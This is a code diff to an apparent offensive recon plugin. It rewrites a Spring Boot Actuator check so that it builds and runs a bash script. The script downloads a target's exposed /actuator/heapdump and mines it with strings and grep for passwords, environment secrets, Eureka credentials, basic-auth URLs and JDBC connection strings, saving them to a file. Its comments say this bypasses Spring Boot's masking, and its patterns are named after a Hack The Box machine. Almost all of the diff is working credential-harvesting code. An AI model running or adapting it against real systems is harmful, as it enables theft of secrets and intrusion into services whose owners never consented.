@@ -265,59 +265,89 @@ class SpringBootActuator(ServiceScan):
 					heapdump_creds_file = f'{{scandir}}/CREDENTIALS_{{port}}_{hostname_label}.txt'
 					raw_creds_file = f'{{scandir}}/RAW_CREDENTIALS_{{port}}_{hostname_label}.txt'
 					heapdump_file = f'{{scandir}}/heapdump_{{port}}_{hostname_label}.hprof'
+					script_file = f'{{scandir}}/heapdump_extract_{{port}}_{hostname_label}.sh'
 					
-					# Step 1: Download heapdump in completely separate command (no binary through CommandStreamReader)
-					service.info(f"🔽 Step 1: Downloading binary heapdump file...")
-					await service.execute(
-						f'echo "=== Downloading heapdump binary file ===" && '
-						f'curl -s -m {timeout*6} {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump '
-						f'-o {heapdump_file} 2>/dev/null && '
-						f'echo "Download completed - size: $(stat -c%s {heapdump_file} 2>/dev/null || echo unknown) bytes"',
-						outfile=None  # No file output to avoid binary issues
-					)
+					# Create a completely separate shell script to handle binary processing
+					# This ensures NO binary data ever goes through CommandStreamReader
+					service.info(f"🔽 Creating binary-safe heapdump extraction script...")
 					
-					# Step 2: Process the downloaded file for credentials
-					service.info(f"🔍 Step 2: Extracting credentials from downloaded heapdump...")
+					# Create the shell script content
+					script_content = f'''#!/bin/bash
+# Binary-safe heapdump credential extraction script
+# This script handles all binary processing externally from ipcrawler
+
+HEAPDUMP_URL="{{http_scheme}}://{hostname}:{{port}}/actuator/heapdump"
+HEAPDUMP_FILE="{heapdump_file}"
+CREDS_FILE="{raw_creds_file}"
+TIMEOUT={timeout*6}
+
+echo "=== BINARY-SAFE HEAPDUMP CREDENTIAL EXTRACTION ==="
+echo "Target: $HEAPDUMP_URL"
+echo "Output: $CREDS_FILE"
+echo ""
+
+# Step 1: Download heapdump (binary safe)
+echo "🔽 Downloading heapdump..."
+if curl -s -m $TIMEOUT "$HEAPDUMP_URL" -o "$HEAPDUMP_FILE" >/dev/null 2>&1; then
+    if [ -f "$HEAPDUMP_FILE" ]; then
+        FILESIZE=$(stat -c%s "$HEAPDUMP_FILE" 2>/dev/null || echo "unknown")
+        echo "✅ Download completed - size: $FILESIZE bytes"
+        
+        # Step 2: Extract credentials using strings (text-only processing)
+        echo "🔍 Extracting credentials from memory dump..."
+        
+        # Create credentials file
+        cat > "$CREDS_FILE" << 'HEADER'
+--- RAW CREDENTIALS EXTRACTED FROM HEAPDUMP ---
+Source: {hostname}:{{port}}/actuator/heapdump
+Method: Binary-safe strings extraction (bypasses Spring Boot masking)
+Timestamp: $(date)
+
+HEADER
+
+        # Extract using exact Furni HTB patterns
+        echo "[FURNI HTB - PASSWORD= PATTERNS]" >> "$CREDS_FILE"
+        strings "$HEAPDUMP_FILE" | grep "password=" >> "$CREDS_FILE" 2>/dev/null || echo "No password= patterns found" >> "$CREDS_FILE"
+        echo "" >> "$CREDS_FILE"
+        
+        echo "[FURNI HTB - PWD ENVIRONMENT VARIABLES]" >> "$CREDS_FILE"
+        strings "$HEAPDUMP_FILE" | grep "PWD" >> "$CREDS_FILE" 2>/dev/null || echo "No PWD variables found" >> "$CREDS_FILE"
+        echo "" >> "$CREDS_FILE"
+        
+        echo "[EUREKA SERVER CREDENTIALS]" >> "$CREDS_FILE"
+        strings "$HEAPDUMP_FILE" | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" >> "$CREDS_FILE" 2>/dev/null || echo "No Eureka credentials found" >> "$CREDS_FILE"
+        echo "" >> "$CREDS_FILE"
+        
+        echo "[ALL HTTP BASIC AUTH URLS]" >> "$CREDS_FILE"
+        strings "$HEAPDUMP_FILE" | grep -E "://.*:.*@" >> "$CREDS_FILE" 2>/dev/null || echo "No HTTP auth URLs found" >> "$CREDS_FILE"
+        echo "" >> "$CREDS_FILE"
+        
+        echo "[DATABASE CONNECTION STRINGS]" >> "$CREDS_FILE"
+        strings "$HEAPDUMP_FILE" | grep "jdbc:" >> "$CREDS_FILE" 2>/dev/null || echo "No JDBC URLs found" >> "$CREDS_FILE"
+        
+        echo "✅ Credentials extracted to: $CREDS_FILE"
+        echo "🔍 Quick preview of findings:"
+        echo "=== Password patterns ==="
+        strings "$HEAPDUMP_FILE" | grep "password=" | head -5 2>/dev/null || echo "None found"
+        echo "=== PWD variables ==="
+        strings "$HEAPDUMP_FILE" | grep "PWD" | head -3 2>/dev/null || echo "None found"
+        echo "=== Eureka credentials ==="
+        strings "$HEAPDUMP_FILE" | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -3 2>/dev/null || echo "None found"
+    else
+        echo "❌ Heapdump file not created"
+        exit 1
+    fi
+else
+    echo "❌ Failed to download heapdump"
+    exit 1
+fi
+'''
+					
+					# Write the script to file and execute it
 					await service.execute(
-						f'if [ -f {heapdump_file} ]; then '
-						f'  echo "🔍 Extracting RAW credentials from heapdump memory..." && '
-						f'  echo "=== RAW password= patterns (Furni HTB method) ===" && '
-						f'  strings {heapdump_file} | grep "password=" | head -20 && '
-						f'  echo "=== RAW user/password pairs ===" && '
-						f'  strings {heapdump_file} | grep -E "{{password=.*&.*user=|user=.*password=}}" | head -10 && '
-						f'  echo "=== PWD environment variables ===" && '
-						f'  strings {heapdump_file} | grep "PWD" | head -15 && '
-						f'  echo "=== Eureka server credentials (EurekaSrvr pattern) ===" && '
-						f'  strings {heapdump_file} | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10 && '
-						f'  echo "=== Database connection strings ===" && '
-						f'  strings {heapdump_file} | grep "jdbc:" | head -10 && '
-						f'  echo "=== HTTP Basic Auth URLs ===" && '
-						f'  strings {heapdump_file} | grep -E "://.*:.*@" | head -10 && '
-						f'  echo "=== Creating RAW credentials file ===" && '
-						f'  echo "--- RAW CREDENTIALS EXTRACTED FROM HEAPDUMP ---" > {raw_creds_file} && '
-						f'  echo "Source: {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump" >> {raw_creds_file} && '
-						f'  echo "Method: Raw memory strings extraction (bypasses Spring Boot masking)" >> {raw_creds_file} && '
-						f'  echo "Timestamp: $(date)" >> {raw_creds_file} && '
-						f'  echo "" >> {raw_creds_file} && '
-						f'  echo "[FURNI HTB - PASSWORD= PATTERNS]" >> {raw_creds_file} && '
-						f'  strings {heapdump_file} | grep "password=" >> {raw_creds_file} && '
-						f'  echo "" >> {raw_creds_file} && '
-						f'  echo "[FURNI HTB - PWD ENVIRONMENT]" >> {raw_creds_file} && '
-						f'  strings {heapdump_file} | grep "PWD" >> {raw_creds_file} && '
-						f'  echo "" >> {raw_creds_file} && '
-						f'  echo "[EUREKA SERVER CREDENTIALS]" >> {raw_creds_file} && '
-						f'  strings {heapdump_file} | grep -E "EurekaSrvr|://.*:.*@.*:8761" >> {raw_creds_file} && '
-						f'  echo "" >> {raw_creds_file} && '
-						f'  echo "[ALL HTTP BASIC AUTH URLS]" >> {raw_creds_file} && '
-						f'  strings {heapdump_file} | grep -E "://.*:.*@" >> {raw_creds_file} && '
-						f'  echo "" >> {raw_creds_file} && '
-						f'  echo "[DATABASE CONNECTIONS]" >> {raw_creds_file} && '
-						f'  strings {heapdump_file} | grep "jdbc:" >> {raw_creds_file} && '
-						f'  echo "✅ RAW credentials saved to: {raw_creds_file}" && '
-						f'  echo "⚠️  Check the credentials file for actual passwords"; '
-						f'else '
-						f'  echo "❌ Heapdump download failed - file not found"; '
-						f'fi',
+						f'cat > {script_file} << \'EOF\'\n{script_content}\nEOF\n'
+						f'chmod +x {script_file} && '
+						f'{script_file}',
 						outfile=heapdump_outfile
 					)
 				else:
